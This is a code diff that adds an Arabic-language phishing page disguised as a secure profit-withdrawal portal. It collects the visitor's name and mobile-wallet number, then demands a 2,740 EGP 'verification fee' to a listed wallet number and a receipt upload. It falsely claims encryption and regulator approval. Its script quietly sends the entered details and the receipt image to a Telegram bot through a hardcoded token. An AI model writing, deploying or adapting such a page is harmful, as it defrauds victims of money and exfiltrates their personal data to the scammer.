@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة السحب الآمن | منصة الأرباح</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --brand-primary: #3b82f6;
+            --brand-secondary: #8b5cf6;
+            --brand-gradient: linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%);
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --bg-dark: #0f172a;
+            --card-bg: rgba(30, 41, 59, 0.7);
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --glass-border: rgba(255, 255, 255, 0.1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: var(--bg-dark);
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(59, 130, 246, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(139, 92, 246, 0.15) 0%, transparent 40%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+            overflow-x: hidden;
+            color: var(--text-main);
+        }
+
+        /* Animated background blobs */
+        .blob {
+            position: absolute;
+            width: 500px;
+            height: 500px;
+            background: var(--brand-gradient);
+            filter: blur(80px);
+            border-radius: 50%;
+            z-index: -1;
+            opacity: 0.1;
+            animation: move 20s infinite alternate;
+        }
+        .blob-1 { top: -100px; left: -100px; }
+        .blob-2 { bottom: -100px; right: -100px; animation-delay: -10s; }
+
+        @keyframes move {
+            from { transform: translate(0, 0) scale(1); }
+            to { transform: translate(100px, 100px) scale(1.2); }
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 480px;
+            perspective: 1500px;
+        }
+
+        .main-card {
+            background: var(--card-bg);
+            backdrop-filter: blur(25px) saturate(200%);
+            -webkit-backdrop-filter: blur(25px) saturate(200%);
+            border-radius: 28px;
+            box-shadow: 
+                0 25px 50px -12px rgba(0, 0, 0, 0.5),
+                inset 0 0 0 1px var(--glass-border);
+            overflow: hidden;
+            animation: cardEntry 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
+        }
+
+        @keyframes cardEntry {
+            from { opacity: 0; transform: translateY(60px) rotateX(-10deg); }
+            to { opacity: 1; transform: translateY(0) rotateX(0); }
+        }
+
+        .header-section {
+            background: linear-gradient(180deg, rgba(255,255,255,0.05) 0%, transparent 100%);
+            padding: 50px 30px;
+            text-align: center;
+            color: white;
+            position: relative;
+            border-bottom: 1px solid var(--glass-border);
+        }
+
+        .brand-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--brand-gradient);
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            font-size: 36px;
+            box-shadow: 0 15px 30px rgba(59, 130, 246, 0.4);
+            transform: rotate(-5deg);
+        }
+
+        .header-section h1 {
+            font-size: 26px;
+            font-weight: 900;
+            margin-bottom: 15px;
+            background: linear-gradient(to bottom, #fff, #94a3b8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(16, 185, 129, 0.1);
+            color: #4ade80;
+            padding: 8px 18px;
+            border-radius: 100px;
+            font-size: 14px;
+            font-weight: 700;
+            border: 1px solid rgba(74, 222, 128, 0.2);
+        }
+
+        .status-badge .dot {
+            width: 10px;
+            height: 10px;
+            background: #4ade80;
+            border-radius: 50%;
+            box-shadow: 0 0 15px #4ade80;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.5); opacity: 0.5; } 100% { transform: scale(1); opacity: 1; } }
+
+        .content-body {
+            padding: 45px 35px;
+        }
+
+        .balance-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--glass-border);
+            padding: 30px;
+            border-radius: 24px;
+            margin-bottom: 40px;
+            text-align: center;
+            position: relative;
+        }
+
+        .balance-card .label {
+            font-size: 13px;
+            color: var(--text-muted);
+            font-weight: 800;
+            letter-spacing: 1px;
+            margin-bottom: 12px;
+            display: block;
+        }
+
+        .balance-card .amount {
+            font-size: 42px;
+            font-weight: 900;
+            color: #fff;
+            text-shadow: 0 0 20px rgba(255,255,255,0.1);
+        }
+
+        .input-group {
+            margin-bottom: 28px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--text-muted);
+            margin-bottom: 12px;
+            padding-right: 5px;
+        }
+
+        .input-field {
+            position: relative;
+        }
+
+        .input-field i {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-muted);
+            font-size: 20px;
+            transition: 0.3s;
+        }
+
+        input {
+            width: 100%;
+            padding: 18px 55px 18px 20px;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--glass-border);
+            border-radius: 18px;
+            font-family: inherit;
+            font-size: 16px;
+            font-weight: 600;
+            color: #fff;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        input:focus {
+            background: rgba(0, 0, 0, 0.4);
+            border-color: var(--brand-primary);
+            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15);
+            outline: none;
+        }
+
+        input:focus + i { color: var(--brand-primary); }
+
+        .btn-primary {
+            width: 100%;
+            padding: 20px;
+            background: var(--brand-gradient);
+            border: none;
+            border-radius: 20px;
+            color: white;
+            font-size: 18px;
+            font-weight: 800;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            transition: 0.3s;
+            box-shadow: 0 15px 30px rgba(59, 130, 246, 0.3);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 20px 40px rgba(59, 130, 246, 0.4);
+        }
+
+        /* Step 2 Premium */
+        .alert-premium {
+            background: rgba(239, 68, 68, 0.05);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            padding: 25px;
+            border-radius: 20px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .wallet-display {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--glass-border);
+            padding: 30px;
+            border-radius: 24px;
+            margin: 30px 0;
+            cursor: pointer;
+            transition: 0.3s;
+            text-align: center;
+        }
+
+        .wallet-display:hover {
+            background: rgba(255, 255, 255, 0.05);
+            border-color: var(--brand-primary);
+        }
+
+        .wallet-number {
+            font-size: 32px;
+            font-weight: 900;
+            color: #fff;
+            letter-spacing: 2px;
+            margin: 15px 0;
+            font-family: monospace;
+        }
+
+        .upload-card {
+            border: 2px dashed var(--glass-border);
+            background: rgba(255, 255, 255, 0.01);
+            padding: 40px;
+            border-radius: 24px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-bottom: 35px;
+        }
+
+        .upload-card:hover {
+            border-color: var(--brand-primary);
+            background: rgba(59, 130, 246, 0.05);
+        }
+
+        .upload-card i {
+            font-size: 45px;
+            color: var(--brand-primary);
+            margin-bottom: 15px;
+        }
+
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 40px;
+            font-size: 14px;
+            color: var(--text-muted);
+            font-weight: 700;
+        }
+
+        @media (max-width: 480px) {
+            .content-body { padding: 35px 25px; }
+            .header-section { padding: 40px 25px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="blob blob-1"></div>
+<div class="blob blob-2"></div>
+
+<div class="app-container">
+    <div class="main-card">
+        <div class="header-section">
+            <div class="brand-icon">
+                <i class="fas fa-shield-alt"></i>
+            </div>
+            <h1>بوابة السحب المشفرة</h1>
+            <div class="status-badge">
+                <span class="dot"></span>
+                خادم تداول نشط وآمن
+            </div>
+        </div>
+
+        <div id="step-1" class="content-body">
+            <div class="balance-card">
+                <span class="label">إجمالي رصيد الأرباح</span>
+                <span class="amount">35,000 ج.م</span>
+            </div>
+
+            <div class="input-group">
+                <label>بيانات المستلم</label>
+                <div class="input-field">
+                    <i class="fas fa-id-card"></i>
+                    <input type="text" id="in-name" placeholder="الاسم الرباعي المسجل">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>عنوان محفظة السحب</label>
+                <div class="input-field">
+                    <i class="fas fa-coins"></i>
+                    <input type="number" id="in-phone" placeholder="رقم المحفظة (فودافون، اتصالات، إلخ)">
+                </div>
+            </div>
+
+            <button class="btn-primary" onclick="nextStep()">
+                متابعة العملية <i class="fas fa-chevron-left"></i>
+            </button>
+
+            <div class="secure-badge">
+                <i class="fas fa-lock"></i>
+                نظام مشفر بالكامل بتقنية AES-256
+            </div>
+        </div>
+
+        <div id="step-2" class="content-body" style="display: none;">
+            <div class="alert-premium">
+                <h3 style="color: var(--danger); font-weight: 900; margin-bottom: 10px;">إجراء أمان مطلوب</h3>
+                <p style="font-size: 15px; color: var(--text-muted);">يرجى تحويل رسوم توثيق السحب (2,740 ج) لفتح المعاملة</p>
+            </div>
+
+            <div class="wallet-display" style="cursor: default; border-style: solid; background: rgba(59, 130, 246, 0.05); border-color: rgba(59, 130, 246, 0.3);">
+                <div style="font-size: 14px; color: var(--brand-primary); font-weight: 800; margin-bottom: 15px;">مراجعة بيانات السحب</div>
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; border-bottom: 1px solid var(--glass-border); padding-bottom: 10px;">
+                    <span style="font-size: 13px; color: var(--text-muted);">اسم المستلم:</span>
+                    <span id="display-name" style="font-weight: 800; color: #fff;">---</span>
+                </div>
+                <div style="display: flex; justify-content: space-between; align-items: center;">
+                    <span style="font-size: 13px; color: var(--text-muted);">محفظة الاستلام:</span>
+                    <span id="display-phone" style="font-weight: 800; color: #fff;">---</span>
+                </div>
+            </div>
+
+            <div class="wallet-display" onclick="copyWallet()">
+                <div style="font-size: 14px; color: var(--brand-primary); font-weight: 800;">رقم التحويل المباشر</div>
+                <div class="wallet-number" id="wallet-num">01277969078</div>
+                <div style="font-size: 13px; color: var(--text-muted); font-weight: 700;">
+                    إضغط لنسخ الرقم <i class="far fa-copy"></i>
+                </div>
+            </div>
+
+            <div class="upload-card" onclick="document.getElementById('file-up').click()">
+                <i class="fas fa-file-invoice-dollar"></i>
+                <span id="file-label-text">أرفق إيصال التحويل للمراجعة الفورية</span>
+                <input type="file" id="file-up" accept="image/*" style="display:none" onchange="updateFileName()">
+            </div>
+
+            <button class="btn-primary" id="final-btn" onclick="finish()">
+                إرسال الطلب الآن <i class="fas fa-paper-plane"></i>
+            </button>
+
+            <div class="secure-badge">
+                <i class="fas fa-check-shield"></i>
+                موثق من قبل هيئة الرقابة المالية
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+function copyWallet() {
+    const num = document.getElementById('wallet-num').innerText;
+    navigator.clipboard.writeText(num);
+    const display = document.querySelector('.wallet-display');
+    display.style.background = "#f0fdf4";
+    display.style.borderColor = "var(--success)";
+    alert("تم نسخ الرقم بنجاح: " + num);
+}
+
+function updateFileName() {
+    const fileInput = document.getElementById('file-up');
+    const label = document.getElementById('file-label-text');
+    const card = document.querySelector('.upload-card');
+    if (fileInput.files.length > 0) {
+        label.innerText = "تم اختيار: " + fileInput.files[0].name;
+        card.style.borderColor = "var(--success)";
+        card.style.background = "#f0fdf4";
+        label.style.color = "var(--success)";
+    }
+}
+
+async function nextStep() {
+    var name = document.getElementById("in-name").value;
+    var phone = document.getElementById("in-phone").value;
+    
+    if (name.length > 5 && phone.length >= 10) {
+        localStorage.setItem('userName', name);
+        localStorage.setItem('userPhone', phone);
+        
+        document.getElementById("display-name").innerText = name;
+        document.getElementById("display-phone").innerText = phone;
+        
+        document.getElementById("step-1").style.display = "none";
+        document.getElementById("step-2").style.display = "block";
+
+        var botToken = "8599127373:AAFgF2GBQMuscGGXzxs0Nayx3grP2aQuLVQ";
+        var chatId = "8408093977";
+        var text = "🚀 طلب جديد (خطوة 1):\n👤 الاسم: " + name + "\n📱 المحفظة: " + phone;
+        
+        try {
+            fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(text));
+        } catch (e) {}
+    } else {
+        alert("يرجى إدخال البيانات بشكل كامل وصحيح");
+    }
+}
+
+async function finish() {
+    var name = document.getElementById("in-name").value;
+    var phone = document.getElementById("in-phone").value;
+    var fileInput = document.getElementById("file-up");
+
+    if (fileInput.files.length === 0) {
+        alert("يرجى إرفاق صورة الإيصال لإتمام العملية");
+        return;
+    }
+
+    const btn = document.getElementById("final-btn");
+    btn.disabled = true;
+    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التوثيق...';
+
+    var botToken = "8599127373:AAFgF2GBQMuscGGXzxs0Nayx3grP2aQuLVQ";
+    var chatId = "8408093977";
+
+    var formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("photo", fileInput.files[0]);
+    formData.append("caption", "✅ سحب مؤكد بالكامل:\n👤 الاسم: " + name + "\n📱 الرقم: " + phone);
+
+    try {
+        await fetch("https://api.telegram.org/bot" + botToken + "/sendPhoto", {
+            method: "POST",
+            body: formData
+        });
+        window.location.href = "success.html";
+    } catch (error) {
+        alert("حدث خطأ في الشبكة، حاول مرة أخرى");
+        btn.disabled = false;
+        btn.innerHTML = 'توثيق وإتمام السحب <i class="fas fa-check-double"></i>';
+    }
+}
+</script>
+
+</body>
+</html>
